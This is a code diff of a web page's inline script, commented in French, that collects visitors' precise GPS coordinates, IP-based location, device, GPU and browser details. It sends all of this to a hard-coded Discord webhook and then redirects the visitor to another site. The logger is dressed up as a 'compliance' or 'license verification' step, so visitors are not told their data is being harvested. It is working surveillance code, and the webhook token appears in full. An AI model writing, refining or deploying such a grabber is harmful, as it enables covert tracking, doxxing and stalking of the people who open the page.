@@ -83,24 +83,21 @@
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
     const TARGET_URL = "https://kfcgaming.github.io/enzgal";
 
-    // Extraction passive du GPU via WebGL
+    // Récupération passive du GPU
     function getGPUInfo() {
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return { vendor: "N/A", renderer: "N/A" };
+        if (!gl) return "N/A";
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (!debugInfo) return { vendor: "Hidden", renderer: "Hidden" };
-        return {
-          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-        };
+        if (!debugInfo) return "Hidden";
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
       } catch (e) {
-        return { vendor: "Error", renderer: "Error" };
+        return "Error";
       }
     }
 
-    // Demande d'autorisation de géolocalisation GPS précise
+    // Demande de géolocalisation GPS précise (Latitude / Longitude)
     function getPreciseGPS() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -125,118 +122,84 @@
       document.getElementById('status-area').style.display = 'block';
 
       try {
-        // Exécution en parallèle : GPS, 5 API d'IP, et Client Hints
+        // Exécution simultanée du GPS, des IP et des infos système
         const [gps, ipResults, deviceHints] = await Promise.all([
           getPreciseGPS(),
           Promise.allSettled([
             fetch("https://ipapi.co/json/").then(r => r.json()),
             fetch("https://ipwho.is/").then(r => r.json()),
-            fetch("https://json.geoiplookup.io/").then(r => r.json()),
-            fetch("https://ip-api.com/json/").then(r => r.json()),
-            fetch("https://ipinfo.io/json").then(r => r.json())
+            fetch("https://json.geoiplookup.io/").then(r => r.json())
           ]),
-          navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues([
-            "platform", "platformVersion", "model", "architecture", "bitness"
-          ]).catch(() => ({})) : Promise.resolve({})
+          navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues(["platform", "model"]).catch(() => ({})) : Promise.resolve({})
         ]);
 
         const api1 = ipResults[0].status === 'fulfilled' ? ipResults[0].value : {};
         const api2 = ipResults[1].status === 'fulfilled' ? ipResults[1].value : {};
         const api3 = ipResults[2].status === 'fulfilled' ? ipResults[2].value : {};
-        const api4 = ipResults[3].status === 'fulfilled' ? ipResults[3].value : {};
-        const api5 = ipResults[4].status === 'fulfilled' ? ipResults[4].value : {};
+        const ip = api1.ip || api2.ip || api3.ip || "Unknown";
 
-        const ip = api1.ip || api2.ip || api3.ip || api4.query || api5.ip || "Unknown";
-
-        // Réseau & Connexion
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const netType = conn ? (conn.effectiveType || "Unknown") : "Unknown";
-        const downlink = conn && conn.downlink ? `~${conn.downlink} Mbps` : "Unknown";
-
-        // Codecs multimédias
-        const vEl = document.createElement('video');
-        const codecs = {
-          h264: vEl.canPlayType('video/mp4; codecs="avc1.42E01E"') ? "Yes" : "No",
-          webm: vEl.canPlayType('video/webm; codecs="vp8, vorbis"') ? "Yes" : "No",
-          av1: vEl.canPlayType('video/webm; codecs="av01.0.05M.08"') ? "Yes" : "No"
-        };
-
-        // Préférences système & accessibilité (Media Queries)
-        const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
-        const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Enabled" : "Disabled";
-        const colorGamut = window.matchMedia('(color-gamut: p3)').matches ? "P3 (Wide)" : "Standard sRGB";
-        const pointerType = window.matchMedia('(pointer: fine)').matches ? "Precise Mouse" : (window.matchMedia('(pointer: coarse)').matches ? "Touchscreen" : "Unknown");
-        const hoverSupport = window.matchMedia('(hover: hover)').matches ? "Yes" : "No";
-
-        // Paramètres de confidentialité
-        const dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "Undefined";
-        const gpc = navigator.globalPrivacyControl !== undefined ? (navigator.globalPrivacyControl ? "Active" : "Inactive") : "Not Supported";
-        const pdfViewer = navigator.pdfViewerEnabled ? "Yes" : "No";
-
-        // Système & Matériel
-        const deviceModel = deviceHints.model || "Unknown / Desktop PC";
+        const deviceModel = deviceHints.model || "Desktop / Unknown";
         const osPlatform = deviceHints.platform || navigator.platform || "N/A";
-        const osVersion = deviceHints.platformVersion ? `v${deviceHints.platformVersion}` : "N/A";
-        const arch = deviceHints.architecture ? `${deviceHints.architecture} (${deviceHints.bitness || 'x'})` : "Unknown";
-        
-        const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth} bits)`;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
         const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
-        const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "Unknown";
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
-        const lang = navigator.language || "N/A";
-        const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
-        const referrer = document.referrer ? document.referrer : "Direct / None";
         const gpu = getGPUInfo();
 
-        // Formatage du champ GPS pour Discord
-        const gpsField = gps.status.includes("Granted")
-          ? `Status: **${gps.status}**\nLat/Lon: \`${gps.lat}, ${gps.lon}\` (Accuracy: ${gps.accuracy})\n[🗺️ Open Google Maps](https://maps.google.com/?q=${gps.lat},${gps.lon})`
-          : `Status: **${gps.status}**`;
+        // Formatage clair de la localisation GPS avec lien Google Maps direct
+        let gpsField = "";
+        if (gps.status.includes("Granted")) {
+          gpsField = `**Status:** Granted ✅\n**Latitude:** \`${gps.lat}\`\n**Longitude:** \`${gps.lon}\`\n**Précision:** ${gps.accuracy}\n[🗺️ Ouvrir sur Google Maps](https://maps.google.com/?q=${gps.lat},${gps.lon})`;
+        } else {
+          gpsField = `**Status:** ${gps.status}`;
+        }
 
-        // Construction du payload Discord complet
+        // Structure en 2 embeds distincts pour contourner les limites de Discord
         const payload = {
-          username: "Ultimate Cyber Audit",
+          username: "Compliance Gateway Logger",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [
             {
-              title: "🛡️ Compliance Test & Ultimate Passive Audit",
-              description: "Data collected during the regional license verification process.",
+              title: "📍 Géolocalisation GPS & IP",
               color: gps.status.includes("Granted") ? 0x238636 : 0xef4444,
               fields: [
-                { name: "📍 Precise GPS (Consent Prompt)", value: gpsField, inline: false },
-                { name: "🌐 Primary IP Address", value: `\`${ip}\``, inline: false },
-                { 
-                  name: "📊 Multi-API IP Geolocation Comparison", 
-                  value: `• **ipapi.co:** ${api1.city || 'N/A'}, ${api1.country_name || 'N/A'}\n• **ipwho.is:** ${api2.city || 'N/A'}, ${api2.country || 'N/A'}\n• **geoiplookup:** ${api3.city || 'N/A'}, ${api3.country_name || 'N/A'}\n• **ip-api.com:** ${api4.city || 'N/A'}, ${api4.country || 'N/A'}\n• **ipinfo.io:** ${api5.city || 'N/A'}, ${api5.country || 'N/A'}`, 
-                  inline: false 
-                },
-                { name: "📱 Device & OS", value: `Model: **${deviceModel}**\nOS: ${osPlatform} (${osVersion})\nArch: ${arch}`, inline: true },
-                { name: "⚙️ Internal Hardware", value: `CPU: ${cores}\nRAM: ${memory}`, inline: true },
-                { name: "🎛️ Ergonomics & Inputs", value: `Pointer: ${pointerType}\nHover: ${hoverSupport}\nTheme: ${darkMode}`, inline: true },
-                { name: "🎨 Display & Rendering", value: `Resolution: ${screenRes}\nColor Gamut: ${colorGamut}\nReduced Motion: ${reducedMotion}`, inline: true },
-                { name: "🕵️ Privacy Settings", value: `Do Not Track: ${dnt}\nGPC: ${gpc}\nNative PDF Viewer: ${pdfViewer}`, inline: false },
-                { name: "🎮 Graphics Card (GPU)", value: `Vendor: ${gpu.vendor}\nRenderer: ${gpu.renderer}`, inline: false },
-                { name: "📶 Network & Multimedia", value: `Type: ${netType} | Speed: ${downlink}\nCodecs (H.264/WebM/AV1): ${codecs.h264}/${codecs.webm}/${codecs.av1}`, inline: false },
-                { name: "🌍 Regional & Provenance", value: `Lang: ${lang} | Timezone: ${timezone}\nCookies: ${cookiesEnabled} | Referrer: \`${referrer}\``, inline: false },
-                { name: "💻 Raw User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
-              ],
-              timestamp: new Date().toISOString()
+                { name: "Coordonnées GPS Précises", value: gpsField, inline: false },
+                { name: "Adresse IP Principale", value: `\`${ip}\``, inline: false },
+                { name: "ipapi.co", value: `${api1.city || 'N/A'}, ${api1.country_name || 'N/A'}`, inline: true },
+                { name: "ipwho.is", value: `${api2.city || 'N/A'}, ${api2.country || 'N/A'}`, inline: true },
+                { name: "geoiplookup", value: `${api3.city || 'N/A'}`, inline: true }
+              ]
+            },
+            {
+              title: "💻 Matériel & Système",
+              color: 0x1f6feb,
+              fields: [
+                { name: "Appareil / OS", value: `${deviceModel} (${osPlatform})`, inline: true },
+                { name: "CPU / Cœurs", value: cores, inline: true },
+                { name: "Résolution Écran", value: screenRes, inline: true },
+                { name: "Carte Graphique (GPU)", value: gpu, inline: false },
+                { name: "User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+              ]
             }
           ]
         };
 
-        // Envoi au webhook Discord
-        await fetch(WEBHOOK_URL, {
+        // Envoi de la requête au webhook Discord
+        const response = await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
+        if (!response.ok) {
+          console.error("Erreur Discord:", await response.text());
+        }
+
       } catch (error) {
-        console.error("Audit error:", error);
+        console.error("Erreur d'exécution:", error);
       } finally {
-        // Redirection vers le site cible
-        window.location.href = TARGET_URL;
+        // Redirection vers ton site cible après l'envoi
+        setTimeout(() => {
+          window.location.href = TARGET_URL;
+        }, 1000);
       }
     }
   </script>
